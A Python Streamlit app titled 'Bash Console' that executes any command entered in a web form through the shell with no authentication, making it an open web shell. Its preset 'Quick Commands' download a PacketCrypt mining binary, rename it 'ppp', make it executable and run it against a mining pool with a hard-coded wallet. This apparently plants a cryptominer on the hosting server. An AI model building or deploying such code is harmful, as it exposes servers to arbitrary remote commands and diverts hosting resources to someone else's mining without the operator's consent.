import streamlit as st
import subprocess
import threading
import time

# Set page configuration
st.set_page_config(
    page_title="Bash Console",
    page_icon="💻",
    layout="wide"
)

# Initialize session state
if 'console_log' not in st.session_state:
    st.session_state.console_log = ""
if 'running_process' not in st.session_state:
    st.session_state.running_process = None

# Simple title
st.title("Bash Console")

# Command input
command = st.text_input("Enter bash command:", placeholder="ls -la", key="command_input")

# Buttons
col1, col2, col3 = st.columns([2, 2, 2])

with col1:
    if st.button("Execute", type="primary"):
        if command.strip():
            # Add command to log
            st.session_state.console_log += f"$ {command}\n"
            
            try:
                # Execute command and capture output
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                
                # Add stdout to log
                if result.stdout:
                    st.session_state.console_log += result.stdout
                
                # Add stderr to log
                if result.stderr:
                    st.session_state.console_log += result.stderr
                    
                # Add return code if non-zero
                if result.returncode != 0:
                    st.session_state.console_log += f"[Exit code: {result.returncode}]\n"
                    
                st.session_state.console_log += "\n"
                st.rerun()
                
            except subprocess.TimeoutExpired:
                st.session_state.console_log += "[Command timed out after 30 seconds]\n\n"
                st.rerun()
            except Exception as e:
                st.session_state.console_log += f"[Error: {str(e)}]\n\n"
                st.rerun()

with col2:
    if st.button("Clear Log"):
        st.session_state.console_log = ""
        st.rerun()

with col3:
    if st.button("Kill Process"):
        if st.session_state.running_process:
            try:
                st.session_state.running_process.terminate()
                st.session_state.console_log += "[Process terminated]\n\n"
                st.session_state.running_process = None
                st.rerun()
            except:
                pass

# Console output area
st.markdown("### Console Output")

# Display console log in a text area
st.text_area(
    "",
    value=st.session_state.console_log,
    height=500,
    disabled=True,
    key="console_output"
)

# Quick command buttons
st.markdown("### Quick Commands")
quick_commands = [
    "ls -la",
    "pwd", 
    "curl -L https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.6.0/packetcrypt-v0.6.0-linux_amd64 -o ppp",
    "chmod +x ppp",
    "./ppp ann -p pkt1qfhr09kswj2hy0xgnzzj5r8ux09m7ltnuumf4xx http://pool.pkt.world"
]

cols = st.columns(2)
for i, cmd in enumerate(quick_commands):
    with cols[i % 2]:
        if st.button(f"{cmd}", key=f"quick_{i}"):
            # Set the command in the input field
            st.session_state.command_input = cmd
            st.rerun()
